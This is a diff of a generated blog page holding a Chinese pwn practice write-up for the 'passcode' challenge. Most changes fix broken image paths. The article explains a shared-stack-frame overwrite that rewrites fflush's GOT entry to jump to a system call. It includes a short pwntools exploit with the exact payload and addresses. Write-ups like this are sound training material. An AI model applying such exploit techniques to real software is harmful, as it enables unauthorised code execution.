@@ -14,17 +14,17 @@
 <meta property="og:url" content="https://niwbie.github.io/2016/12/29/pwn练习(一)之缓冲区溢出/index.html">
 <meta property="og:site_name" content="isee'blog">
 <meta property="og:description" content="passcode">
-<meta property="og:image" content="https://niwbie.github.io/image/pwn练习(一">
-<meta property="og:image" content="https://niwbie.github.io/image/pwn练习(一">
-<meta property="og:image" content="https://niwbie.github.io/image/pwn练习(一">
-<meta property="og:image" content="https://niwbie.github.io/image/pwn练习(一">
-<meta property="og:image" content="https://niwbie.github.io/image/pwn练习(一">
-<meta property="og:image" content="https://niwbie.github.io/image/pwn练习(一">
-<meta property="og:updated_time" content="2017-11-12T07:35:54.949Z">
+<meta property="og:image" content="https://niwbie.github.io/image/pwn练习一之缓冲区溢出/1.png">
+<meta property="og:image" content="https://niwbie.github.io/image/pwn练习一之缓冲区溢出/2.png">
+<meta property="og:image" content="https://niwbie.github.io/image/pwn练习一之缓冲区溢出/3.png">
+<meta property="og:image" content="https://niwbie.github.io/image/pwn练习一之缓冲区溢出/4.png">
+<meta property="og:image" content="https://niwbie.github.io/image/pwn练习一之缓冲区溢出/5.png">
+<meta property="og:image" content="https://niwbie.github.io/image/pwn练习一之缓冲区溢出/6.png">
+<meta property="og:updated_time" content="2017-11-12T07:40:11.413Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="pwn练习(一)之缓冲区溢出">
 <meta name="twitter:description" content="passcode">
-<meta name="twitter:image" content="https://niwbie.github.io/image/pwn练习(一">
+<meta name="twitter:image" content="https://niwbie.github.io/image/pwn练习一之缓冲区溢出/1.png">
   
     <link rel="alternative" href="/atom.xml" title="isee&#39;blog" type="application/atom+xml">
   
@@ -158,13 +158,13 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><a href="/image/PWN练习之爆破绕过canary/passcode">passcode</a></p>
+        <p><a href="/image/pwn练习一之缓冲区溢出/passcode">passcode</a></p>
 <a id="more"></a>
-<p>从IDA和gdb调试来看，两个scanf分别将参数写入int v1和int v2所指向的地址中去，看起来似乎没什么问题。<br><img src="/image/pwn练习(一" alt="这里写图片描述">之缓冲区溢出/1.png)</p>
-<p>转到main函数：<br><img src="/image/pwn练习(一" alt="这里写图片描述">之缓冲区溢出/2.png)</p>
-<p>再看welcome函数：<br><img src="/image/pwn练习(一" alt="这里写图片描述">之缓冲区溢出/3.png)</p>
+<p>从IDA和gdb调试来看，两个scanf分别将参数写入int v1和int v2所指向的地址中去，看起来似乎没什么问题。<br><img src="/image/pwn练习一之缓冲区溢出/1.png" alt="这里写图片描述"></p>
+<p>转到main函数：<br><img src="/image/pwn练习一之缓冲区溢出/2.png" alt="这里写图片描述"></p>
+<p>再看welcome函数：<br><img src="/image/pwn练习一之缓冲区溢出/3.png" alt="这里写图片描述"></p>
 <p>发现这里其实是需要输入100个字节长度的，并且在main函数中，welcome和login两个函数其实是共用一个ebp的，就是说welcome存放在局部变量v1中的字符有可能被覆盖到login函数的局部变量v1，我们可以通过gdb调试来看。</p>
-<p>先看welcome，v1的地址为0xffffcff8 ：<br><img src="/image/pwn练习(一" alt="这里写图片描述">之缓冲区溢出/4.png)</p>
+<p>先看welcome，v1的地址为0xffffcff8 ：<br><img src="/image/pwn练习一之缓冲区溢出/4.png" alt="这里写图片描述"></p>
 <p>再看login ，v1的地址是0xffffd058</p>
 <p>0xffffd058 - 0xffffcff8 = 96。  也就是说，在welcome中输入96个字节后，后面4个字节刚好能够覆盖到login的v1，从而对该值指向的地址进行写入。这样，我们可以通过修改fflush的got地址（0x804a004）为后面调用system<br>处的地址（0x80485e3）,并且由于是“%d”输入，所以要将0x80485e3改为 “134514147”。</p>
 <p>from pwn import <em><br>payload = ‘c’</em>96+p32(0x804A004) </p>
@@ -173,7 +173,7 @@
 <p>payload = ‘134514147’<br>e.sendline(payload)</p>
 <p>#e.recvuntil(‘passcode1 : ‘)</p>
 <p>#e.recv()</p>
-<p>e.interactive()<br><img src="/image/pwn练习(一" alt="这里写图片描述">之缓冲区溢出/5.png)<br><img src="/image/pwn练习(一" alt="这里写图片描述">之缓冲区溢出/6.png)</p>
+<p>e.interactive()<br><img src="/image/pwn练习一之缓冲区溢出/5.png" alt="这里写图片描述"><br><img src="/image/pwn练习一之缓冲区溢出/6.png" alt="这里写图片描述"></p>
 
       
     </div>
